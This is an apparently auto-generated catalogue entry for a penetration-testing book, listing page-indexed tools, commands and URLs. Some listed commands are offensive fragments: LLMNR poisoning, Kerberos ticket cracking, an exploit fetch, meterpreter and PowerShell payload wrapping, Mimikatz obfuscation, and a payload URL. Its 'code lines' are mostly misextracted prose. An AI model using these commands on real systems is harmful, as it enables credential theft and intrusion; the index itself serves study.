@@ -1,0 +1,838 @@
+# The Hacker Playbook 3: Practical Guide To Penetration Testing
+
+## Metadata
+- Status: `cyber-active`
+- Reason: 20 strong cyber signals, 30 total signals
+- Source path: `/run/media/aops/SapoHD/ComputerScience/Git/B00Ks/My-CyberSecurity-Store/Books/The Hacker Playbook 3 - Practical Guide To Penetration Testing.pdf`
+- SHA256: `0d16e56ace337ddbe89520586b0d62c090e2563ebdd43c459b84d3ead193baf4`
+- Pages: `264`
+- Text characters: `585466`
+- Author: `Peter Kim`
+- Copied PDF: [[PDFs/the-hacker-playbook-3-practical-guide-to-penetration-testing-0d16e56a.pdf|Open copied PDF]]
+
+## Duplicate Paths
+- none
+
+## Tools
+- p. 4: nmap
+- p. 38: burp
+- p. 4: metasploit
+- p. 22: kali
+- p. 22: docker
+- p. 5: linux
+- p. 6: bash
+- p. 21: python
+- p. 3: tor
+- p. 4: monit
+- p. 236: codex
+
+## Commands
+- p. 21: `ssh -i cert ubuntu@[ip]`
+- p. 21: `git clone https://github.com/trustedsec/ptf /opt/ptf`
+- p. 29: `wget http://security.debian.org/debian-`
+- p. 29: `wget http://security.ubuntu.com/ubuntu/pool/main/i/icu/libicu55_55.1-`
+- p. 31: `git clone https://github.com/iagox86/dnscat2.git`
+- p. 31: `git clone https://github.com/iagox86/dnscat2.git /opt/dnscat2/client`
+- p. 40: `nmap [IP Range]/24 --open -p 80,443 -oX scan.xml`
+- p. 40: `python ./EyeWitness.py -x scan.xml --web`
+- p. 44: `python ./sslScrape.py [IP Address CIDR Range]`
+- p. 46: `git clone https://github.com/leebaird/discover /opt/discover/`
+- p. 47: `python ./knockpy.py cyberspacekittens.com`
+- p. 47: `python sublist3r.py -d cyberspacekittens.com -o cyberspacekittens.com`
+- p. 48: `python truffleHog.py https://github.com/cyberspacekittens/dnscat2`
+- p. 49: `docker run -it abhartiya/tools_gitallsecrets:v3 -`
+- p. 49: `docker ps -a`
+- p. 49: `docker cp <container-id>:/data/results.txt .`
+- p. 50: `wget https://digi.ninja/files/bucket_finder_1.1.tar.bz2 -O`
+- p. 115: `python ./Responder.py -I eth0 -wfFbv`
+- p. 116: `python ./Responder.py -I eth0 -rv`
+- p. 117: `nmap -p88 --script krb5-enum-users --script-args krb5-enum-`
+- p. 123: `python ./windows-exploit-suggester.py -i ./windows.txt -d 2018-03-21-`
+- p. 151: `python tgsrepcrack.py [password wordlist] [kirbi tickets - *.kirbi]`
+- p. 155: `ssh -i key.pem ubuntu@[VPS IP] -L 127.0.0.1:3389:127.0.0.1:3389`
+- p. 157: `ssh -D 127.0.0.1:8888 -p 22 <user>@<Target_IP>`
+- p. 157: `ssh <user>@<Target_IP> -L 127.0.0.1:55555:<Target_to_Pivot_to>:80`
+- p. 159: `wget http://bit.ly/2vdh2Ub -O dirtycow-mem.c`
+- p. 161: `nmap 172.16.50.0/24`
+- p. 162: `python -m SimpleHTTPServer 80`
+- p. 166: `ssh -i ~/.ssh/id_rsa root@172.16.250.30`
+- p. 168: `python3 ./decrypt.py master.key hudson.util.Secret credentials.xml`
+- p. 181: `python embedInHTML.py -k keypasshere -f meterpreter.xll -o index.html -w`
+- p. 181: `python demiguise.py -k hello -c "cmd.exe /c <powershell_command_here>" -p`
+- p. 184: `python3 ./generateJenkinsExploit.py -e badware.exe`
+- p. 185: `python3 ./generateJenkinsExploit.py -p`
+- p. 191: `ssh -i LightsailDefaultPrivateKey-us-west-2.pem ubuntu@[IP]`
+- p. 191: `wget http://swupdate.openvpn.org/as/openvpn-as-2.1.12-`
+- p. 193: `nmap x.x.x.x/24 -p22 -T5 --open`
+- p. 198: `wget bashbunny.com/bb.sh`
+- p. 198: `git clone https://github.com/lgandx/Responder.git /tools/responder`
+- p. 199: `git clone https://github.com/CoreSecurity/impacket.git /tools/impacket`
+- p. 199: `git clone https://github.com/hak5/bashbunny-payloads.git`
+- p. 213: `git clone https://github.com/cheetz/thpDropper.git`
+- p. 217: `git clone https://github.com/cyberspacekittens/metasploit-framework`
+- p. 217: `git clone https://github.com/cyberspacekittens/metasploit-payloads`
+- p. 220: `python SharpShooter.py --interactive`
+- p. 222: `git clone https://github.com/GreatSCT/GreatSCT.git /opt/`
+- p. 222: `python3 ./gr8sct.py`
+- p. 229: `python hidemyps.py invoke_mimikatz.ps1 [filename.ps1]`
+- p. 240: `python ./PACK-0.0.4/statsgen.py hashes.password`
+- p. 240: `python ./PACK-0.0.4/statsgen.py hashes.password --minlength=10 -o`
+- p. 240: `python ./PACK-0.0.4/maskgen.py hashes.masks --optindex -q -o`
+
+## Code And Script Lines
+- p. 8: `from personal experience and what actually worked. I think there has been a major`
+- p. 9: `from readers is that they tend to gain the most benefit from the books after reading`
+- p. 23: `from the web, as AV might trigger on it. Also, a simple solution is obfuscation using`
+- p. 23: `from scratch to evade both host and network based detection tools.`
+- p. 38: `#!/bin/bash`
+- p. 38: `if [ -e /opt/nmap_diff/scan_$y.xml ]; then`
+- p. 42: `from SSL certificates. Typically, one of the major difficulties for Red Teamers is`
+- p. 98: `from the outside and find that no other web ports are currently listening, but what`
+- p. 102: `from parsing the XML file.`
+- p. 129: `import to gather this data:`
+- p. 130: `from WinSCP, PuTTY, SuperPuTTY, FileZilla, and Microsoft Remote Desktop. One`
+- p. 144: `from Empire):`
+- p. 153: `from a Domain Controller. Generally limited to the Domain Admins, Enterprise`
+- p. 166: `from our attacker machine, through the dnscat, to the Jenkins box (172.16.250.30) over`
+- p. 193: `from turtle.opvn and save`
+- p. 207: `function are an integer that tells Windows how to interpret the message. Two of these`
+- p. 207: `function to chain to the next hook procedure is optional, but it is highly recommended;`
+- p. 208: `function looks like this:`
+- p. 212: `from touching disk.`
+- p. 252: `from your toolset, how quickly will your IR teams see it and react to it?`
+
+## URLs
+- p. 10: https://www.forbes.com/sites/thomasbrewster/2015/12/17/facebook-instagram-
+- p. 10: https://nakedsecurity.sophos.com/2012/02/20/jail-facebook-ethical-hacker/
+- p. 10: https://www.cyberscoop.com/dji-bug-bounty-drone-technology-sean-melia-
+- p. 10: https://www.eff.org/pages/legal-
+- p. 13: http://www.pentest-standard.org
+- p. 14: http://www.informationisbeautiful.net/visualizations/worlds-biggest-
+- p. 14: https://en.wikipedia.org/wiki/Sony_Pictures_hack
+- p. 14: https://www.esecurityplanet.com/network-security/almost-a-third-of-all-u.s.-
+- p. 18: https://www2.fireeye.com/rs/848-DID-242/images/rpt-apt29-hammertoss.pdf
+- p. 18: http://bit.ly/2GZb8eW
+- p. 20: http://bit.ly/2H0MTZA
+- p. 20: https://www.digitalocean.com/products/compute
+- p. 20: https://lightsail.aws.amazon.com
+- p. 20: https://aws.amazon.com/service-terms/
+- p. 20: https://lightsail.aws.amazon.com/
+- p. 21: https://github.com/trustedsec/ptf
+- p. 22: https://blog.cobaltstrike.com/2016/09/28/cobalt-strike-rce-active-exploitation-
+- p. 22: http://bit.ly/2qz2vN9
+- p. 22: https://github.com/Coalfire-Research/Red-Baron
+- p. 23: https://github.com/rapid7/metasploit-framework/commits/master
+- p. 23: http://bit.ly/2H2PTsI
+- p. 23: https://github.com/trustedsec/unicorn
+- p. 23: https://github.com/rapid7/metasploit-
+- p. 24: http://bit.ly/2qxCbCZ
+- p. 24: http://bit.ly/2IUc4Oe.
+- p. 24: http://bit.ly/2GYw55A
+- p. 24: http://bit.ly/2HoCRFi
+- p. 25: http://bit.ly/2Hn7RW4.
+- p. 25: http://bit.ly/2HjM3eH.
+- p. 25: https://bitrot.sh/post/30-11-2017-domain-
+- p. 25: https://amzn.to/2I6lSry
+- p. 26: https://www.cobaltstrike.com/help-smb-beacon
+- p. 26: https://github.com/rsmudge/Malleable-C2-
+- p. 26: https://github.com/rsmudge/Malleable-C2-Profiles
+- p. 26: https://github.com/bluscreenofjeff/Malleable-C2-Randomizer.
+- p. 27: https://www.cobaltstrike.com/aggressor-script/index.html
+- p. 27: http://bit.ly/2qxIwPE.
+- p. 27: https://github.com/EmpireProject/Empire
+- p. 29: http://security.debian.org/debian-
+- p. 29: http://security.ubuntu.com/ubuntu/pool/main/i/icu/libicu55_55.1-
+- p. 29: https://github.com/PowerShell/PowerShell/releases/download/v6.0.2/powershell_6.0.2
+- p. 30: https://github.com/iagox86/dnscat2
+- p. 31: https://github.com/iagox86/dnscat2.git
+- p. 32: https://github.com/lukebaggett/dnscat2-powershell.
+- p. 34: http://bit.ly/2GXhdnZ
+- p. 34: https://github.com/inquisb/icmpsh
+- p. 34: https://github.com/jamesbarlow/icmptunnel,
+- p. 34: https://github.com/DhavalKapil/icmptunnel
+- p. 34: http://code.gerade.org/hans/.
+- p. 35: https://github.com/Cn33liz/p0wnedShell
+- p. 35: https://github.com/n1nj4sec/pupy
+- p. 35: https://github.com/nettitude/PoshC2
+- p. 35: https://github.com/Ne0nd0g/merlin
+- p. 35: https://medium.com/@Ne0nd0g/introducing-merlin-645da3c635a#df21
+- p. 35: https://github.com/samratashok/nishang
+- p. 36: http://thehackerplaybook.com/get.php?type=THP-vm.
+- p. 39: https://github.com/robertdavidgraham/masscan
+- p. 39: http://bit.ly/2H1o5AW
+- p. 39: https://github.com/breenmachine/httpscreenshot
+- p. 40: https://github.com/ChrisTruncer/EyeWitness
+- p. 41: http://bit.ly/2vUSjED
+- p. 41: http://bit.ly/2r7rHeR
+- p. 41: http://bit.ly/2HAsZFm
+- p. 42: https://www.shodan.io
+- p. 42: https://censys.io/
+- p. 43: https://github.com/christophetd/censys-subdomain-finder.
+- p. 44: https://github.com/cheetz/sslScrape
+- p. 45: https://www.arin.net/.
+- p. 45: https://centralops.net/co/domaindossier.aspx
+- p. 45: https://github.com/leebaird/discover
+- p. 46: http://bit.ly/2JOkUyj
+- p. 46: http://bit.ly/2qwxrxB.
+- p. 46: https://github.com/danielmiessler/SecLists/tree/master/Discovery/DNS.
+- p. 47: http://bit.ly/2qwxrxB
+- p. 47: https://github.com/Plazmaz/Sublist3r.
+- p. 47: https://www.us-cert.gov/ncas/alerts/TA13-088A
+- p. 47: https://github.com/TheRook/subbrute
+- p. 48: http://bit.ly/2EMKIHg
+- p. 48: https://github.com/cyberspacekittens/dnscat2
+- p. 49: https://github.com/cheetz/dnscat2/tree/master/server/controller.
+- p. 49: https://github.com/anshumanbh/git-all-secrets
+- p. 49: https://hackerone.com/reports/121461
+- p. 49: https://hackerone.com/reports/128088
+- p. 50: https://github.com/bbb31/slurp
+- p. 50: https://digi.ninja/files/bucket_finder_1.1.tar.bz2
+- p. 51: https://aws.amazon.com/s/dm/optimization/server-
+- p. 51: https://amzn.to/2ItaySR
+- p. 53: https://labs.detectify.com/2017/07/13/a-deep-dive-into-aws-s3-access-
+- p. 53: https://github.com/nahamsec/HostileSubBruteforcer
+- p. 53: https://github.com/JordyZomer/autoSubTakeover
+- p. 53: http://flaws.cloud/.
+- p. 54: https://thehackernews.com/2017/12/data-
+- p. 54: https://nakedsecurity.sophos.com/2013/11/04/anatomy-of-a-password-disaster-
+- p. 55: http://psbdmp.ws/
+- p. 55: https://github.com/IVMachiavelli/OSINT_Team_Links
+- p. 55: http://osintframework.com/
+- p. 57: http://bit.ly/2HokWi0
+- p. 57: http://bit.ly/2qwEMxH
+- p. 57: http://ubr.to/2hIO2tZ
+- p. 57: http://bit.ly/2GZbVZd
+- p. 57: https://www.owasp.org/images/1/19/OTGv4.pdf
+- p. 57: https://www.hackerone.com
+- p. 57: https://bugcrowd.com/programs
+- p. 58: https://www.synack.com/red-team/
+- p. 58: https://www.vulnerability-lab.com/list-of-bug-bounty-programs.php
+- p. 58: http://pages.ebay.com/securitycenter/Researchers.html
+- p. 58: https://buer.haus/breport/index.php.
+- p. 59: http://thehackerplaybook.com/get.php?type=csk-web
+- p. 59: https://github.com/cheetz/THP-ChatSupportSystem/blog/master/lab.txt
+- p. 59: http://bit.ly/2qBDrFo
+- p. 60: http://chat:3000/.
+- p. 60: http://bit.ly/2HAhoGR.
+- p. 60: http://bit.ly/2GZbVZd.
+- p. 60: http://bit.ly/2qyA9m1.
+- p. 61: https://nodejs.org/en/
+- p. 61: https://www.bleepingcomputer.com/news/security/52-percent-of-all-javascript-npm-
+- p. 61: https://expressjs.com/
+- p. 61: https://pugjs.org/
+- p. 62: https://wappalyzer.com/
+- p. 63: https://builtwith.com/
+- p. 63: https://chrome.google.com/webstore/detail/retirejs/moibopkbhjceeedibkbkbchb
+- p. 64: https://portswigger.net/burp
+- p. 64: http://bit.ly/2IVNaO2
+- p. 64: http://chat:3000
+- p. 64: https://github.com/OJ/gobuster
+- p. 64: https://github.com/danielmiessler/SecLists/tree/master/Discovery/Web-Content
+- p. 65: http://<Your
+- p. 65: http://the.earth.li/~sgtatham/putty/latest/x86/putty.exe
+- p. 65: https://www.youtube.com/watch?v=dQw4w9WgXcQ
+- p. 65: http://www.xss-payloads.com/payloads-list.html?c#category=capture
+- p. 65: https://github.com/foospidy/payloads/tree/master/other/xss
+- p. 65: https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet
+- p. 65: https://www.w3schools.com/tags/ref_eventattributes.asp
+- p. 66: http://test.cyberspacekittens.com
+- p. 66: http://chat:3000/
+- p. 66: http://chat:3000/chatchannel/1
+- p. 66: http://bit.ly/2qvnLEq.
+- p. 66: https://html5sec.org/.
+- p. 67: http://bit.ly/2GXxqxH
+- p. 67: https://github.com/0xsobky/HackVault/wiki/Unleashing-an-Ultimate-XSS-Polyglot
+- p. 67: http://chat:3000/xss
+- p. 67: http://beefproject.com/
+- p. 67: http://127.0.0.1:3000/hook.js
+- p. 68: http://127.0.0.1:3000/hook.js,
+- p. 69: https://xsshunter.com
+- p. 70: https://xsshunter.com/app
+- p. 72: https://en.wikipedia.org/wiki/String_interpolation
+- p. 72: https://pugjs.org/language/interpolation.html
+- p. 72: https://pugjs.org/language/code.html#unescaped-buffered-code
+- p. 73: http://chat:3000/xss.
+- p. 75: https://pugjs.org/language/code.html
+- p. 75: http://www.jsfuck.com/.
+- p. 77: https://github.com/Varbaek/xsser.
+- p. 77: http://sqlmap.org/
+- p. 78: http://chat:3000/nosql
+- p. 80: https://www.npmjs.com/package/qs
+- p. 80: http://chat:3000/nosql2
+- p. 81: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20injecti
+- p. 81: https://blog.websecurify.com/2014/08/hacking-nodejs-and-
+- p. 81: https://www.owasp.org/index.php/Testing_for_NoSQL_injection
+- p. 81: https://github.com/frohoff/ysoserial
+- p. 82: https://github.com/luin/serialize
+- p. 82: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5941
+- p. 82: https://github.com/luin/serialize/search?utf8=%E2%9C%93&q=eval&type=
+- p. 82: https://en.wikipedia.org/wiki/Immediately-invoked_function_expression
+- p. 82: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5941.
+- p. 84: http://chat:3000/hacked.txt
+- p. 85: https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-
+- p. 85: https://snyk.io/test/npm/node-serialize?
+- p. 85: https://blog.websecurify.com/2017/02/hacking-node-serialize.html
+- p. 86: http://ubm.io/2ECTYSi
+- p. 86: http://chat:3000/directmessage
+- p. 86: http://chat:3000/ti?
+- p. 88: http://bit.ly/2qxeDiy
+- p. 92: http://chat:3000/accounts.txt
+- p. 92: https://github.com/epinna/tplmap
+- p. 92: http://chat:3000/ti?user=*&comment=asdfasdf&link=
+- p. 93: http://blog.portswigger.net/2015/08/server-side-template-injection.html
+- p. 93: https://hawkinsecurity.com/2017/12/13/rce-via-spring-engine-ssti/
+- p. 93: https://imagetragick.com/
+- p. 93: https://github.com/tennc/webshell.
+- p. 96: https://i.imgur.com/FdtLoFI.jpg
+- p. 96: http://127.0.0.1:80/favicon.ico
+- p. 96: http://127.0.0.1:8080,
+- p. 96: http://192.168.10.2-254?
+- p. 97: http://bit.ly/2ELv5zZ
+- p. 97: http://chat:3000/directmessage.
+- p. 97: http://cyberspacekittens.com
+- p. 97: http://127.0.0.1:3000
+- p. 98: http://127.0.0.1:§3000§
+- p. 99: http://chat:3000/ssrf?
+- p. 99: http://127.0.0.1:28017,
+- p. 100: http://chat:3000/serverStatus?text=1
+- p. 100: http://127.0.0.1:28017/serverStatus?text=1.
+- p. 100: http://www.agarri.fr/docs/AppSecEU15-
+- p. 101: http://bit.ly/2ELvJxp
+- p. 101: http://thehackerplaybook.com/get.php?type=XXE-vm
+- p. 101: http://[IP
+- p. 103: http://[Your_IP
+- p. 103: http://[YOUR_IP
+- p. 104: http://php.net/manual/en/wrappers.php.php
+- p. 104: https://gist.github.com/staaldraad/01415b990939494879b4
+- p. 104: https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/XXE-
+- p. 108: http://bit.ly/2qyB9rb
+- p. 108: http://bit.ly/2EJve6N
+- p. 109: https://mail.cyberspacekittens.com/owa/auth/logon.aspx?
+- p. 109: https://github.com/sensepost/ruler
+- p. 110: https://sensepost.com/blog/2017/outlook-forms-and-shells/.
+- p. 111: https://github.com/Narcolapser/python-o365#email.
+- p. 112: https://blogs.technet.microsoft.com/canitpro/2017/02/22/step-by-step-
+- p. 112: http://bit.ly/2JN8E19
+- p. 112: https://helpdeskgeek.com/how-to/windows-join-domain/
+- p. 112: https://www.youtube.com/watch?v=vxXLJSbx1SI
+- p. 112: http://bit.ly/2EL0uTd
+- p. 112: http://bit.ly/2qyJs5D
+- p. 112: https://support.microsoft.com/en-us/help/324737/how-to-turn-on-automatic-
+- p. 112: http://bit.ly/2EKatIk
+- p. 112: https://www.rootusers.com/how-to-install-iis-in-windows-server-2016/
+- p. 113: http://bit.ly/2JJQvRK
+- p. 113: https://support.microsoft.com/en-us/help/929650/how-to-use-spns-when-you-
+- p. 113: http://bit.ly/2IXZygL
+- p. 113: https://github.com/lgandx/Responder
+- p. 114: https://hashcat.net/wiki/doku.php?id=example_hashes
+- p. 115: https://nmap.org/nsedoc/scripts/smb-security-
+- p. 116: http://g-
+- p. 116: http://threat.tevora.com/quick-tip-skip-cracking-responder-hashes-and-replay-
+- p. 117: https://github.com/Kevin-
+- p. 119: https://github.com/leostat/rtfm
+- p. 121: https://github.com/EmpireProject/Empire/blob/master/data/module_source/privesc/PowerUp
+- p. 123: http://www.fuzzysecurity.com/tutorials/16.html.
+- p. 123: https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Invoke-MS16-
+- p. 123: https://github.com/FuzzySecurity/PSKernel-
+- p. 123: http://bit.ly/2HnX5id,
+- p. 123: http://insecure.org/search.html?q=privilege%20escalation
+- p. 123: https://bugs.chromium.org/p/project-zero/issues/list?
+- p. 124: https://github.com/rapid7/metasploitable3
+- p. 125: https://github.com/gentilkiwi/mimikatz
+- p. 126: http://bit.ly/2vhFBiZ
+- p. 127: https://github.com/putterpanda/mimikittenz
+- p. 129: https://github.com/samratashok/nishang/blob/master/Gather/Get-
+- p. 129: https://github.com/peewpw/Invoke-WCMDump/blob/master/Invoke-
+- p. 129: https://github.com/sekirkity/BrowserGather,
+- p. 130: https://github.com/fireeye/SessionGopher
+- p. 132: https://msdn.microsoft.com/en-us/library/ms677949(v=vs.85
+- p. 134: http://bit.ly/2JKTg5d
+- p. 134: http://bit.ly/2r9lYnH
+- p. 137: https://technet.microsoft.com/en-us/windows/release-info.aspx.
+- p. 138: https://github.com/BloodHoundAD/BloodHound
+- p. 138: https://github.com/BloodHoundAD/BloodHound/tree/master/Ingestors
+- p. 139: http://localhost:7474
+- p. 139: https://github.com/cyberspacekittens/bloodhound,
+- p. 140: https://blog.cptjesus.com/posts/introtocypher.
+- p. 140: https://porterhau5.com/blog/extending-bloodhound-track-and-
+- p. 141: https://github.com/porterhau5/BloodHound-
+- p. 141: https://github.com/porterhau5/BloodHound-Owned.
+- p. 142: https://wald0.com/?p=112
+- p. 142: http://bit.ly/2GYU7S7
+- p. 142: http://ubm.io/2GI5EAq
+- p. 142: https://www.offensive-security.com/metasploit-unleashed/fun-incognito/
+- p. 143: http://bit.ly/2HDxj6x
+- p. 144: http://bit.ly/2JJ7ILb
+- p. 145: http://bit.ly/2qxq49L
+- p. 145: http://www.harmj0y.net/blog/empire/empire-1-5/
+- p. 146: https://enigma0x3.net/2017/01/23/lateral-movement-via-
+- p. 147: https://bit.ly/2pzJ9GX
+- p. 148: https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/
+- p. 148: https://enigma0x3.net/2017/09/11/lateral-movement-using-excel-application-
+- p. 148: https://www.cybereason.com/blog/dcom-lateral-movement-techniques
+- p. 148: http://bit.ly/2qzsyDI
+- p. 150: https://room362.com/post/2017/dump-laps-passwords-with-ldapsearch/
+- p. 150: https://raw.githubusercontent.com/nidem/ker
+- p. 151: https://powersploit.readthedocs.io/en/latest/Recon/Invoke-Kerberoast/
+- p. 151: http://bit.ly/2qx4kuH
+- p. 152: https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/Invoke-
+- p. 153: http://bit.ly/2HpvKwj
+- p. 157: https://github.com/huntergregal/mimipenguin.
+- p. 157: http://bit.ly/2EMpPfb
+- p. 157: https://github.com/rebootuser/LinEnum
+- p. 158: https://github.com/mzet-/linux-
+- p. 159: https://dirtycow.ninja/
+- p. 159: http://bit.ly/2vdh2Ub
+- p. 160: http://thehackerplaybook.com/get.php?type=csk-lab
+- p. 163: http://<your_ip
+- p. 165: https://raw.githubusercontent.com/cheetz/dirtycow/master/THP-Lab
+- p. 167: http://127.0.0.1:8080/jenkins
+- p. 167: http://bit.ly/2GUIN9s
+- p. 168: https://github.com/cheetz/jenkins-decrypt
+- p. 172: http://bit.ly/2HlctvY.
+- p. 173: https://github.com/trustedsec/social-engineer-toolkit.
+- p. 173: https://github.com/fireeye/ReelPhish:
+- p. 174: https://www.fireeye.com/blog/threat-
+- p. 174: https://github.com/kgretzky/evilginx
+- p. 174: https://github.com/ustayready/CredSniper
+- p. 175: http://getgophish.com/documentation/
+- p. 175: https://github.com/pentestgeek/phishing-
+- p. 175: https://github.com/securestate/king-
+- p. 178: https://github.com/curi0usJack/luckystrike
+- p. 178: https://www.shellntel.com/blog/2016/9/13/luckystrike-a-database-backed-evil-macro-generator
+- p. 178: https://github.com/Pepitoh/VBad
+- p. 179: https://msdn.microsoft.com/en-
+- p. 180: https://sensepost.com/blog/2017/macro-less-code-exec-in-msword/
+- p. 180: https://github.com/bhdresh/CVE-2017-0199
+- p. 180: https://rhinosecuritylabs.com/research/abusing-microsoft-word-features-phishing-
+- p. 180: http://bit.ly/2qxOuiA
+- p. 181: https://github.com/Arno0x/EmbedInHTML
+- p. 181: https://github.com/nccgroup/demiguise
+- p. 183: https://github.com/cheetz/generateJenkinsExploit
+- p. 184: http://mirrors.jenkins.io/war-stable/1.651.2/
+- p. 184: http://<Jenkins_IP
+- p. 184: http://bit.ly/2IUG8cs
+- p. 185: http://<attacker_IP
+- p. 187: http://hackerwarehouse.com/product/proxmark3-rdv2-kit/
+- p. 188: https://blog.kchung.co/rfid-
+- p. 188: https://www.southord.com/
+- p. 188: https://www.lockpickshop.com/GATE-BYPASS.html
+- p. 188: https://www.lockpickshop.com/SJ-50.html
+- p. 188: https://shop.riftrecon.com/products/under-the-door-tool
+- p. 188: https://www.youtube.com/watch?v=xcA7iXSNmZE
+- p. 190: https://www.youtube.com/watch?v=b7qr0laM8kA.
+- p. 191: https://openvpn.net/index.php/access-server/download-openvpn-as-
+- p. 191: http://swupdate.openvpn.org/as/openvpn-as-2.1.12-
+- p. 191: https://[IP
+- p. 192: https://[Your
+- p. 196: https://medium.com/@tomac/a-15-openwrt-based-diy-
+- p. 196: https://www.hak5.org/episodes/hak5-1921-access-internal-networks-with-
+- p. 196: http://www.ubuntuboss.com/how-to-install-openvpn-access-server-on-ubuntu-
+- p. 196: https://trick77.com/how-to-set-up-transparent-vpn-internet-gateway-tunnel-
+- p. 196: https://www.hak5.org/gear/packet-squirrel/docs
+- p. 196: https://hakshop.com/collections/usb-rubber-ducky
+- p. 197: http://www.piotrbania.com/all/kon-
+- p. 198: https://bashbunny.com/downloads
+- p. 198: https://github.com/lgandx/Responder.git
+- p. 199: https://github.com/CoreSecurity/impacket.git
+- p. 199: https://github.com/hak5/bashbunny-payloads.git
+- p. 199: https://github.com/hak5/bashbunny-
+- p. 199: https://room362.com/post/2016/snagging-creds-from-locked-machines/
+- p. 199: https://www.youtube.com/watch?v=Aatp5gCskvk
+- p. 200: https://samy.pl/poisontap/
+- p. 200: https://github.com/hak5/bashbunny-payloads/tree/master/payloads/library.
+- p. 201: https://github.com/derv82/wifite2
+- p. 201: https://www.wifipineapple.com/pages/nano
+- p. 202: https://github.com/s0lst1c3/eaphammer
+- p. 202: https://github.com/s0lst1c3/eaphammer#iii---stealing-ad-credentials-using-hostile-
+- p. 202: https://github.com/s0lst1c3/eaphammer#iv---
+- p. 206: http://bit.ly/2qBEzsC
+- p. 207: http://bit.ly/2HomCYQ
+- p. 207: http://bit.ly/2EMAGpw
+- p. 207: https://github.com/cheetz/ceylogger/blob/master/skeleton.
+- p. 208: http://bit.ly/2H0n68h
+- p. 208: https://github.com/cheetz/ceylogger/blob/master/callback
+- p. 209: http://bit.ly/2HAiVN7
+- p. 209: https://github.com/cheetz/ceylogger/tree/master/version1.
+- p. 210: https://github.com/cheetz/ceylogger/tree/master/version2.
+- p. 210: https://github.com/cheetz/ceylogger/blob/master/version3/version_3.c#L197-L241
+- p. 210: http://bit.ly/2H0VboE
+- p. 211: https://github.com/cheetz/ceylogger/tree/master/version3.
+- p. 211: https://www.virustotal.com/#/file/4f7e3e32f50171fa527cd1e53d33cc08ab85e7a945cf0
+- p. 211: http://bit.ly/2IXfuQh
+- p. 211: https://www.virustotal.com/#/file/8032c4fe2a59571daa83b6e2db09ff2eba66fd299633
+- p. 211: http://bit.ly/2IYyM7F
+- p. 211: https://www.virustotal.com/#/file/e13d0e84fa8320e310537c7fdc4619170bfdb20214ba
+- p. 211: http://bit.ly/2JNcBmc
+- p. 213: https://github.com/cheetz/thpDropper.git
+- p. 216: http://bit.ly/2H2kaUB
+- p. 216: http://bit.ly/2IS9Hvl
+- p. 216: http://bit.ly/2qyWfFK
+- p. 217: http://bit.ly/2JKUhdx
+- p. 217: http://bit.ly/2ELYkm8
+- p. 217: https://github.com/rapid7/metasploit-payloads/tree/master/c/meterpreter
+- p. 217: https://github.com/rapid7/metasploit-framework/wiki/Setting-Up-a-Metasploit-
+- p. 217: http://releases.llvm.org/download.html
+- p. 217: http://gnuwin32.sourceforge.net/packages/make.htm
+- p. 217: https://github.com/cyberspacekittens/metasploit-framework
+- p. 217: https://github.com/cyberspacekittens/metasploit-payloads
+- p. 219: https://github.com/thealpiste/C_ReverseHTTPS_Shellcode
+- p. 220: https://github.com/mdsecactivebreach/CACTUSTORCH
+- p. 220: https://www.mdsec.co.uk/2018/03/payload-generation-using-sharpshooter/
+- p. 220: http://10.100.100.9/malware.payload
+- p. 221: https://github.com/mdsecactivebreach/SharpShooter
+- p. 222: https://github.com/GreatSCT/GreatSCT
+- p. 222: https://github.com/GreatSCT/GreatSCT.git
+- p. 222: https://github.com/GreatSCT/GreatSCT/tree/develop
+- p. 223: https://github.com/api0cradle/UltimateAppLockerByPassList
+- p. 223: https://www.blackhillsinfosec.com/evade-application-whitelisting-using-
+- p. 223: https://rileykidd.com/2017/08/03/application-whitelist-bypass-using-
+- p. 223: https://bohops.com/2018/03/10/leveraging-inf-sct-fetch-execute-
+- p. 223: https://pentestlab.blog/2017/05/11/applocker-bypass-regsvr32/
+- p. 224: https://github.com/secretsquirrel/the-backdoor-factory
+- p. 224: https://haiderm.com/fully-undetectable-backdooring-pe-file/#Code_Caves
+- p. 224: https://www.abatchy.com/2017/05/introduction-to-manual-
+- p. 225: http://bit.ly/2JHVdzf
+- p. 225: https://github.com/danielbohannon/Invoke-Obfuscation
+- p. 227: https://github.com/danielbohannon/Invoke-CradleCrafter
+- p. 228: https://github.com/trustedsec/nps_payload
+- p. 228: http://www.sixdub.net/?p=555
+- p. 228: https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick
+- p. 228: https://bneg.io/2017/07/26/empire-without-powershell-exe/
+- p. 228: https://github.com/cheetz/hidemyps
+- p. 228: http://bit.ly/2H3CNXS
+- p. 232: http://bit.ly/2vn1wFB
+- p. 234: http://bit.ly/2IXgIel
+- p. 234: https://github.com/bluscreenofjeff/AggressorScripts
+- p. 234: https://github.com/harleyQu1nn/AggressorScripts
+- p. 234: https://github.com/SpiderLabs/portia
+- p. 234: https://github.com/mitre/caldera
+- p. 234: http://bit.ly/2HqbYk8
+- p. 234: http://thehackerplaybook.com/get.php?type=THP-password.
+- p. 235: http://www.nvidia.com/object/tesla-servers.html,
+- p. 235: https://medium.com/@iraklis/running-hashcat-v4-0-0-in-amazons-aws-new-p3-
+- p. 235: https://downloads.pwnedpasswords.com/passwords/pwned-passwords-
+- p. 236: https://inteltechniques.com/OSINT/pastebins.html.
+- p. 236: http://bit.ly/2EMs6am
+- p. 236: http://bit.ly/2GXRNus
+- p. 236: https://hashes.org/left.php
+- p. 236: https://crackstation.net/files/crackstation.txt.gz
+- p. 236: https://weakpass.com/wordlist
+- p. 236: https://github.com/cyberspacekittens/google-10000-english
+- p. 236: https://wiki.skullsecurity.org/Passwords
+- p. 236: https://github.com/cyberspacekittens/SecLists
+- p. 236: http://www.adeptus-mechanicus.com/codex/hashpass/hashpass.php
+- p. 237: http://contest-
+- p. 237: https://github.com/hashcat/hashcat/tree/master/rules
+- p. 237: http://contest-2010.korelogic.com/rules-hashcat.html
+- p. 237: https://github.com/cyberspacekittens/nsa-rules
+- p. 237: https://github.com/cyberspacekittens/Hob0Rules
+- p. 237: https://github.com/cyberspacekittens/password_cracking_rules
